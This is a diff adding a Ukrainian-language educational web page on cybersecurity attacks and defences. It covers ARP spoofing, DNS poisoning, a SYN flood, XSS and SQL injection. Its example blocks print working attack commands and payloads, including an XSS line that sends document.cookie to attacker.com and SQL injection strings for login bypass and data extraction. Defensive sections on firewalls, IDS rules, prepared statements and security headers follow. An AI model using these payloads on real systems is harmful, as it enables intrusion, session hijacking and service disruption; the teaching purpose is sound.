@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <title>Приклади | Термінал кібербезпеки</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="header-bar">
+        <div class="container header-container">
+            <div class="logo">
+                <a href="index.html" class="logo-link">guide.sec</a>
+            </div>
+            <nav class="top-nav">
+                <a href="index.html">Головна</a>
+                <a href="main.html">Основне</a>
+                <a href="tools.html">Інструменти</a>
+                <a href="examples.html" class="active">Приклади</a>
+                <a href="contacts.html">Контакти</a>
+            </nav>
+        </div>
+    </div>
+
+    <div class="container main-container">
+        <div class="content-section">
+            <h2>Приклади атак та захисту</h2>
+            <div class="card">
+                <div class="card-header">
+                    <h3>Приклади атак на мережеву безпеку</h3>
+                </div>
+                <div class="card-body">
+                    <p>Мережеві атаки спрямовані на компрометацію мережевої інфраструктури, перехоплення трафіку або порушення доступності послуг. Розуміння цих атак дозволяє краще захистити вашу інфраструктуру.</p>
+
+                    <h4>Типи мережевих атак</h4>
+                    <ul>
+                        <li><strong>MITM (Man-in-the-Middle)</strong> - перехоплення комунікації між двома сторонами</li>
+                        <li><strong>DoS/DDoS (Denial of Service)</strong> - атаки на відмову в обслуговуванні</li>
+                        <li><strong>ARP Spoofing</strong> - підміна ARP-таблиць для перенаправлення трафіку</li>
+                        <li><strong>DNS Poisoning</strong> - підміна DNS-записів для перенаправлення користувачів</li>
+                        <li><strong>Port Scanning</strong> - сканування портів для виявлення вразливостей</li>
+                    </ul>
+
+                    <h4>Приклади мережевих атак</h4>
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <span>network-attacks.sh</span>
+                        </div>
+                        <div class="terminal-content">
+                            <p># ARP Spoofing з використанням arpspoof</p>
+                            <p>$ arpspoof -i eth0 -t 192.168.1.5 192.168.1.1</p>
+                            <p># DNS Poisoning з використанням Ettercap</p>
+                            <p>$ ettercap -T -q -i eth0 -P dns_spoof -M arp // //</p>
+                            <p># Port Scanning з використанням Nmap</p>
+                            <p>$ nmap -sV -p 1-1000 192.168.1.1</p>
+                            <p># Перехоплення пакетів з використанням Wireshark (tcpdump)</p>
+                            <p>$ tcpdump -i eth0 -n "tcp port 80"</p>
+                            <p># SYN Flood DoS-атака</p>
+                            <p>$ hping3 -S --flood -V -p 80 target_ip</p>
+                        </div>
+                    </div>
+
+                    <h4>Захист від мережевих атак</h4>
+                    <ul>
+                        <li>
+                            <strong>Міжмережеві екрани (Firewalls)</strong> - налаштування правил для фільтрації трафіку:
+                            <pre><code># Приклад правила iptables
+$ iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
+$ iptables -A INPUT -p tcp --dport 22 -j DROP</code></pre>
+                        </li>
+                        <li>
+                            <strong>Системи виявлення вторгнень (IDS/IPS)</strong> - моніторинг та блокування підозрілої активності:
+                            <pre><code># Приклад правила для Snort
+alert tcp any any -> 192.168.1.0/24 80 (msg:"HTTP Traffic"; sid:1000001; rev:1;)</code></pre>
+                        </li>
+                        <li>
+                            <strong>VPN та шифрування трафіку</strong> - забезпечення конфіденційності даних, що передаються:
+                            <pre><code># Встановлення з'єднання OpenVPN
+$ openvpn --config client.ovpn</code></pre>
+                        </li>
+                        <li><strong>Сегментація мережі</strong> - розділення мережі на ізольовані сегменти для обмеження доступу.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h3>Приклади XSS-атак (Cross-Site Scripting)</h3>
+                </div>
+                <div class="card-body">
+                    <p>XSS-атаки дозволяють зловмисникам впроваджувати шкідливий JavaScript-код у веб-сторінки, які переглядають інші користувачі. Це може призвести до викрадення сеансів, перенаправлення та інших зловмисних дій.</p>
+
+                    <h4>Типи XSS-атак</h4>
+                    <ul>
+                        <li><strong>Відображені XSS (Reflected XSS)</strong> - код виконується негайно і зазвичай доставляється через URL.</li>
+                        <li><strong>Збережені XSS (Stored XSS)</strong> - код зберігається на сервері та активується при перегляді сторінки.</li>
+                        <li><strong>DOM-based XSS</strong> - вразливості у клієнтському JavaScript, який модифікує DOM.</li>
+                    </ul>
+
+                    <h4>Приклади XSS-коду</h4>
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <span>xss-examples.js</span>
+                        </div>
+                        <div class="terminal-content">
+                            <p>// Базовий XSS для виклику alert</p>
+                            <p>&lt;script&gt;alert('XSS');&lt;/script&gt;</p>
+                            <p>// XSS з викраденням cookie</p>
+                            <p>&lt;script&gt;</p>
+                            <p>fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));</p>
+                            <p>&lt;/script&gt;</p>
+                            <p>// XSS через атрибути подій</p>
+                            <p>&lt;img src="x" onerror="alert('XSS')"&gt;</p>
+                            <p>// XSS через URL-параметри (Reflected XSS)</p>
+                            <p>// example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
+                            <p>// XSS з обходом фільтрів</p>
+                            <p>&lt;img src="javascript:alert('XSS')"&gt;</p>
+                            <p>&lt;div onmouseover="alert('XSS')"&gt;Наведіть на мене&lt;/div&gt;</p>
+                        </div>
+                    </div>
+
+                    <h4>Захист від XSS-атак</h4>
+                    <ul>
+                        <li>
+                            <strong>Екранування даних</strong> - перетворення спеціальних символів на їх HTML-сутності:
+                            <pre><code>// Перетворення
+& → &amp;amp;
+< → &amp;lt;
+> → &amp;gt;
+" → &amp;quot;
+' → &amp;#x27;
+/ → &amp;#x2F;</code></pre>
+                        </li>
+                        <li>
+                            <strong>Content Security Policy (CSP)</strong> - додавання HTTP-заголовка:
+                            <pre><code>Content-Security-Policy: default-src 'self';</code></pre>
+                        </li>
+                        <li><strong>HttpOnly та Secure флаги для cookies</strong> - запобігання доступу до cookie через JavaScript.</li>
+                        <li><strong>Валідація введення</strong> - перевірка всіх даних користувача на відповідність очікуваному формату.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h3>Приклади SQL-ін'єкцій</h3>
+                </div>
+                <div class="card-body">
+                    <p>SQL-ін'єкції дозволяють зловмисникам виконувати довільні SQL-запити до бази даних через вразливі точки введення. Ця вразливість може призвести до витоку конфіденційних даних або їх модифікації.</p>
+
+                    <h4>Основні типи SQL-ін'єкцій</h4>
+                    <ul>
+                        <li><strong>Базові SQL-ін'єкції</strong> - прості маніпуляції з SQL-запитами</li>
+                        <li><strong>Сліпі SQL-ін'єкції</strong> - коли результати запиту не відображаються напряму</li>
+                        <li><strong>Time-based SQL-ін'єкції</strong> - використання часових затримок для підтвердження вразливості</li>
+                        <li><strong>Union-based SQL-ін'єкції</strong> - використання оператора UNION для об'єднання результатів</li>
+                    </ul>
+
+                    <h4>Приклади SQL-ін'єкцій</h4>
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <span>sql-injection-examples.sql</span>
+                        </div>
+                        <div class="terminal-content">
+                            <p>-- Базовий приклад для обходу аутентифікації</p>
+                            <p>username: admin' --</p>
+                            <p>password: (будь-який)</p>
+                            <p>-- Запит, який виконується:</p>
+                            <p>SELECT * FROM users WHERE username='admin' --' AND password='(будь-який)';</p>
+                            <p>-- Отримання даних за допомогою UNION</p>
+                            <p>' UNION SELECT username, password FROM users --</p>
+                            <p>-- Вивід версії бази даних (MySQL)</p>
+                            <p>' UNION SELECT 1, version() --</p>
+                            <p>-- Вивід таблиць бази даних (MySQL)</p>
+                            <p>' UNION SELECT 1, table_name FROM information_schema.tables --</p>
+                            <p>-- Time-based ін'єкція (MySQL)</p>
+                            <p>' OR IF(1=1, SLEEP(5), 0) --</p>
+                            <p>-- Сліпа ін'єкція з BOOLEAN операціями</p>
+                            <p>' OR (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --</p>
+                        </div>
+                    </div>
+
+                    <h4>Захист від SQL-ін'єкцій</h4>
+                    <ul>
+                        <li>
+                            <strong>Підготовлені запити (Prepared Statements)</strong> - розділення запиту і даних:
+                            <pre><code>// PHP приклад
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$username]);
+
+// Node.js приклад
+const stmt = db.prepare("SELECT * FROM users WHERE username = ?");
+const user = stmt.get(username);</code></pre>
+                        </li>
+                        <li><strong>ORM (Object-Relational Mapping)</strong> - використання бібліотек для абстракції SQL-запитів.</li>
+                        <li><strong>Валідація введення</strong> - перевірка типів та форматів даних перед використанням.</li>
+                        <li><strong>Мінімальні привілеї</strong> - надання мінімально необхідних прав доступу до бази даних.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h3>Інші рекомендації з безпеки</h3>
+                </div>
+                <div class="card-body">
+                    <ul>
+                        <li>
+                            <strong>CORS (Cross-Origin Resource Sharing)</strong> - правильне налаштування заголовків для контролю міждоменних запитів:
+                            <pre><code>Access-Control-Allow-Origin: https://trusted-site.com
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Content-Type, Authorization</code></pre>
+                        </li>
+                        <li>
+                            <strong>CSRF (Cross-Site Request Forgery)</strong> - захист за допомогою Anti-CSRF токенів:
+                            <pre><code>&lt;input type="hidden" name="csrf_token" value="unique-token-value"&gt;</code></pre>
+                        </li>
+                        <li>
+                            <strong>Безпечна конфігурація HTTP-заголовків</strong>:
+                            <pre><code>X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre>
+                        </li>
+                        <li><strong>HTTPS</strong> - використання захищеного з'єднання для всіх видів комунікації.</li>
+                        <li><strong>Регулярне оновлення залежностей</strong> - для усунення відомих вразливостей.</li>
+                    </ul>
+
+                    <div class="button-container">
+                        <a href="tools.html" class="button">Перейти до інструментів</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 guide.sec | Всі права захищено</p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const sanitizeInput = function(input) {
+                return String(input)
+                    .replace(/&/g, '&amp;')
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/"/g, '&quot;')
+                    .replace(/'/g, '&#x27;')
+                    .replace(/\//g, '&#x2F;');
+            };
+
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of urlParams) {
+                const sanitizedValue = sanitizeInput(value);
+            }
+        });
+    </script>
+</body>
+</html>
